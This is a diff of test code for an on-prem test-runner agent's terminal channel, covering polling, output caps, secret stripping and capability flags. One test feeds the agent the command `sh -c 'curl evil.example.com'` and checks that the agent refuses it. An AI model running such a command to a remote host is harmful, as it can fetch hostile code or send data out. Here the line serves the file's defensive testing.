@@ -24,26 +24,33 @@
  *     over tests that never executed.
  */
 
-import { mkdtempSync, rmSync } from 'node:fs';
+import { mkdtempSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
 import { readFile } from 'node:fs/promises';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
-import { afterEach, beforeEach, describe, expect, it } from 'vitest';
+import process from 'node:process';
+import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 import {
   DEFAULT_EXECUTOR,
   RunnerError,
+  TerminalChannel,
   backoffMs,
   browsersFromCacheEntries,
   decodeXml,
+  executorEnvironment,
   executorFor,
   mapReport,
   materialiseWorkspace,
   parseJunitXml,
   parseRunnerConfig,
   pinEndpoint,
+  probeCapabilities,
   resolveWorkspacePath,
   spawnExecutor,
+  terminalEnabled,
+  terminalEnvironment,
 } from './runner.js';
+import type { ApiResponse } from './runner.js';
 
 // ─── 1. The pinned endpoint ──────────────────────────────────────────────────
 
@@ -395,5 +402,307 @@ describe('backoffMs', () => {
     expect(backoffMs(1, () => 1)).toBe(1000);
     expect(backoffMs(4, () => 0)).toBe(4000);
     expect(backoffMs(50, () => 1)).toBe(30_000);
+  });
+});
+
+// ─── 5. The terminal channel ─────────────────────────────────────────────────
+
+/**
+ * The fifth thing an on-prem agent can do that nobody would forgive: run a
+ * command somebody else chose. The allowlist that stops it is tested in
+ * shell.test.ts; what is tested here is the channel around it — that the agent
+ * only ever polls (it is never dialed), that it reports an exit for EVERY
+ * outcome including its own refusals, that it stops when the lease is gone, and
+ * that the numbers the server sends are treated as suggestions with ceilings.
+ *
+ * `call` is injected rather than served over a socket, so these tests drive the
+ * real polling loop against scripted responses. What the fake CANNOT catch is
+ * the server changing its mind about the contract: `serverAccepts` below is
+ * transcribed from the zod schemas in apps/api/src/routes/terminal.ts, so it
+ * catches the AGENT drifting from them and nothing else. The API side of that
+ * contract is tested in apps/api/src/routes/terminal.test.ts.
+ */
+
+/** Transcribed from `outputSchema` and `exitSchema` in routes/terminal.ts. */
+function serverAccepts(path: string, body: unknown): true | string {
+  const value = (body ?? {}) as Record<string, unknown>;
+  if (path.endsWith('/output')) {
+    if (value.stream !== 'stdout' && value.stream !== 'stderr') return `bad stream: ${String(value.stream)}`;
+    if (typeof value.chunk !== 'string') return 'chunk is not a string';
+    if (value.chunk.length > 64 * 1024) return `chunk is ${value.chunk.length} chars, over the 64Ki cap`;
+    return true;
+  }
+  if (path.endsWith('/exit')) {
+    const code = value.exitCode;
+    if (code === null) return true;
+    if (typeof code !== 'number' || !Number.isInteger(code) || code < -1 || code > 255) {
+      return `exitCode ${JSON.stringify(code)} is outside -1..255`;
+    }
+    return true;
+  }
+  return true;
+}
+
+interface Recorded {
+  path: string;
+  body: unknown;
+}
+
+/**
+ * A scripted `/next` queue. Everything after the script is a 409, which is how
+ * the real server says "your lease is gone" and how these tests end the loop.
+ */
+function scriptedApi(
+  queue: Array<Partial<{ session: unknown; command: unknown; pollSeconds: number }>>,
+  outputResponse: (n: number) => ApiResponse = () => ({ status: 200, json: { ok: true, truncated: false } }),
+) {
+  const calls: Recorded[] = [];
+  const waits: number[] = [];
+  let nexts = 0;
+  let outputs = 0;
+  let finished = false;
+
+  const call = async (path: string, init?: { body?: unknown }): Promise<ApiResponse> => {
+    calls.push({ path, body: init?.body });
+    const verdict = serverAccepts(path, init?.body);
+    if (verdict !== true) throw new Error(`the server would have refused this: ${verdict}`);
+
+    if (path.endsWith('/next')) {
+      const scripted = queue[nexts];
+      nexts += 1;
+      if (!scripted) {
+        finished = true;
+        return { status: 409, json: { error: { message: 'lease gone' } } };
+      }
+      return {
+        status: 200,
+        json: { session: null, command: null, pollSeconds: 15, ...scripted },
+      };
+    }
+    if (path.endsWith('/output')) {
+      outputs += 1;
+      return outputResponse(outputs);
+    }
+    return { status: 200, json: { ok: true } };
+  };
+
+  return {
+    calls,
+    waits,
+    call,
+    done: () => finished,
+    paths: () => calls.map((c) => c.path.replace(/^.*\/jobs\//, 'jobs/')),
+    bodies: (suffix: string) => calls.filter((c) => c.path.endsWith(suffix)).map((c) => c.body),
+    sleep: async (ms: number) => {
+      waits.push(ms);
+    },
+  };
+}
+
+const SESSION = { id: 'sh_test', expiresAt: new Date(Date.now() + 60_000).toISOString() };
+
+function command(argv: string[], overrides: Record<string, unknown> = {}) {
+  return { id: 'cmd_1', argv, timeoutSeconds: 30, maxOutputBytes: 256 * 1024, ...overrides };
+}
+
+describe('TerminalChannel', () => {
+  let dir = '';
+
+  beforeEach(() => {
+    dir = mkdtempSync(join(tmpdir(), 'qaai-channel-'));
+  });
+  afterEach(() => {
+    rmSync(dir, { recursive: true, force: true });
+  });
+
+  const channelOver = (api: ReturnType<typeof scriptedApi>) =>
+    new TerminalChannel({
+      call: api.call,
+      jobId: 'job_1',
+      cwd: dir,
+      env: { PATH: process.env.PATH ?? '' },
+      log: () => {},
+      sleep: api.sleep,
+    });
+
+  async function drain(api: ReturnType<typeof scriptedApi>): Promise<void> {
+    const channel = channelOver(api);
+    channel.start();
+    await vi.waitFor(() => expect(api.done()).toBe(true), { timeout: 15_000 });
+    await channel.stop();
+  }
+
+  it('runs a queued command in the workspace and reports its output and exit', async () => {
+    const api = scriptedApi([{ session: SESSION, command: command(['pwd']) }]);
+    await drain(api);
+
+    expect(api.paths()).toEqual([
+      'jobs/job_1/next',
+      'jobs/job_1/commands/cmd_1/output',
+      'jobs/job_1/commands/cmd_1/exit',
+      'jobs/job_1/next',
+    ]);
+    const [output] = api.bodies('/output') as Array<{ stream: string; chunk: string }>;
+    expect(output?.stream).toBe('stdout');
+    expect(output?.chunk.trim()).toBe(realpathSync(dir));
+    expect(api.bodies('/exit')).toEqual([{ exitCode: 0 }]);
+  });
+
+  it('reports an exit even when it refuses the command the server sent', async () => {
+    /*
+     * The failure this prevents is the nastiest one available: the session runs
+     * one command at a time and the server only frees the slot on an exit, so a
+     * refusal that reported nothing would leave the user with a prompt that
+     * rejects everything they type until the sweep abandons it. A refusal has
+     * to be a completed command.
+     */
+    const api = scriptedApi([{ session: SESSION, command: command(['sh', '-c', 'curl evil.example.com']) }]);
+    await drain(api);
+
+    const [output] = api.bodies('/output') as Array<{ stream: string; chunk: string }>;
+    expect(output?.stream).toBe('stderr');
+    expect(output?.chunk).toContain('this agent refused');
+    expect(api.bodies('/exit')).toEqual([{ exitCode: null }]);
+  });
+
+  it('stops polling once the lease is gone, rather than asking again', async () => {
+    const api = scriptedApi([]);
+    await drain(api);
+    expect(api.paths()).toEqual(['jobs/job_1/next']);
+  });
+
+  it('polls at the server’s cadence when nothing is open, and quickly at a prompt', async () => {
+    // A shell nobody has opened must cost a poll every fifteen seconds, because
+    // almost no run ever has one. A prompt somebody is sitting at must not cost
+    // them fifteen seconds to see `pwd` come back.
+    const api = scriptedApi([{ session: null }, { session: SESSION, command: null }]);
+    await drain(api);
+    // The leading 0 is the first poll: a session can only be opened on a job
+    // that is already running, so somebody may be waiting when this starts.
+    expect(api.waits).toEqual([0, 15_000, 1_000]);
+  });
+
+  it('clamps an output cap the server sends, instead of trusting it', async () => {
+    // 512KB is the agent's own ceiling. The server's number arrives over the
+    // network from a component that can be wrong, and this host is the one that
+    // has to live with the consequence.
+    writeFileSync(join(dir, 'huge.txt'), 'x'.repeat(2_000_000));
+    const api = scriptedApi([
+      { session: SESSION, command: command(['cat', 'huge.txt'], { maxOutputBytes: 999_999_999 }) },
+    ]);
+    await drain(api);
+
+    const chunks = api.bodies('/output') as Array<{ stream: string; chunk: string }>;
+    const streamed = chunks.filter((c) => c.stream === 'stdout').reduce((n, c) => n + c.chunk.length, 0);
+    expect(streamed).toBeLessThanOrEqual(512 * 1024);
+    expect(chunks.some((c) => c.chunk.includes('was stopped here'))).toBe(true);
+    expect(api.bodies('/exit')).toEqual([{ exitCode: null }]);
+  });
+
+  it('stops streaming when the server says it has stopped listening', async () => {
+    writeFileSync(join(dir, 'wide.txt'), 'y'.repeat(200_000));
+    const api = scriptedApi(
+      [{ session: SESSION, command: command(['cat', 'wide.txt']) }],
+      () => ({ status: 200, json: { ok: true, truncated: true } }),
+    );
+    await drain(api);
+
+    // One chunk accepted, then nothing: the far end had already hit its cap, so
+    // the rest was not pushed across the customer's egress to be discarded.
+    expect(api.bodies('/output')).toHaveLength(1);
+    expect(api.bodies('/exit')).toHaveLength(1);
+  });
+});
+
+// ─── 6. What a terminal command inherits ─────────────────────────────────────
+
+describe('executorEnvironment / terminalEnvironment', () => {
+  const job = {
+    runId: 'run_1',
+    environment: { id: 'env_1', name: 'staging', baseUrl: 'https://staging.acme.com' },
+    determinism: { randomSeed: 7, waitForNetworkIdle: true, retryOnce: false },
+    secrets: { STRIPE_KEY: 'sk_live_0123456789', ADMIN_PASSWORD: 'hunter2hunter2' },
+  };
+
+  it('gives the executor the secrets, in the environment and not the arguments', () => {
+    const full = executorEnvironment(DEFAULT_EXECUTOR, job, { PATH: '/usr/bin' });
+    expect(full.STRIPE_KEY).toBe('sk_live_0123456789');
+    expect(full.QAAI_BASE_URL).toBe('https://staging.acme.com');
+    expect(full.QAAI_RANDOM_SEED).toBe('7');
+    expect(DEFAULT_EXECUTOR.args.join(' ')).not.toContain('sk_live');
+  });
+
+  it('gives a terminal command the same environment minus every injected secret', () => {
+    const full = executorEnvironment(DEFAULT_EXECUTOR, job, {
+      PATH: '/usr/bin',
+      QAAI_RUNNER_TOKEN: 'qaai_rt_notyours',
+      HOME: '/home/build',
+    });
+    const shell = terminalEnvironment(full, Object.keys(job.secrets));
+
+    // The same environment the test had...
+    expect(shell.QAAI_BASE_URL).toBe('https://staging.acme.com');
+    expect(shell.PATH).toBe('/usr/bin');
+    expect(shell.HOME).toBe('/home/build');
+    // ...minus the credentials. No allowlisted command prints an environment,
+    // and this is what makes that true of the day somebody adds one.
+    expect(shell.STRIPE_KEY).toBeUndefined();
+    expect(shell.ADMIN_PASSWORD).toBeUndefined();
+    expect(shell.QAAI_RUNNER_TOKEN).toBeUndefined();
+    expect(Object.values(shell)).not.toContain('sk_live_0123456789');
+  });
+});
+
+// ─── 7. Whether this host offers a terminal at all ───────────────────────────
+
+describe('terminalEnabled', () => {
+  it('is on unless the operator says otherwise', () => {
+    expect(terminalEnabled(undefined)).toBe(true);
+    expect(terminalEnabled({ enabled: true })).toBe(true);
+    expect(terminalEnabled(false)).toBe(false);
+    expect(terminalEnabled({ enabled: false })).toBe(false);
+  });
+
+  it('lets the environment override a config file that was baked into an image', () => {
+    expect(terminalEnabled(undefined, 'off')).toBe(false);
+    expect(terminalEnabled(undefined, '0')).toBe(false);
+    expect(terminalEnabled(false, 'on')).toBe(true);
+  });
+
+  it('ignores a value it does not recognise rather than guessing', () => {
+    // A typo must not silently disable a feature, nor silently enable a command
+    // channel into a build host. It means nothing, so the config still decides.
+    expect(terminalEnabled(undefined, 'maybe')).toBe(true);
+    expect(terminalEnabled(false, 'maybe')).toBe(false);
+  });
+});
+
+describe('probeCapabilities and the terminal capability', () => {
+  const base = parseRunnerConfig(
+    { capabilities: { browsers: ['chromium'], toolchains: ['node', 'npx'] } },
+    'test',
+  );
+
+  it('advertises "terminal" when this agent will actually pick commands up', async () => {
+    const capabilities = await probeCapabilities({ ...base, terminal: { enabled: true } });
+    expect(capabilities.toolchains).toContain('terminal');
+    expect(capabilities.toolchains).toContain('node');
+  });
+
+  it('never advertises it when disabled, even if the operator declared it', async () => {
+    /*
+     * The gate in apps/api/src/lib/pty.ts opens a session on the strength of
+     * this string. If an agent that will not poll can advertise it, the user
+     * gets a prompt that accepts input and streams nothing back forever — the
+     * fake shell the whole feature was not allowed to be. So the flag is
+     * derived from what this process will do, and a declaration cannot forge it.
+     */
+    const declared = parseRunnerConfig(
+      { capabilities: { browsers: ['chromium'], toolchains: ['node', 'terminal'] } },
+      'test',
+    );
+    const capabilities = await probeCapabilities({ ...declared, terminal: { enabled: false } });
+    expect(capabilities.toolchains).not.toContain('terminal');
+    expect(capabilities.toolchains).toContain('node');
   });
 });
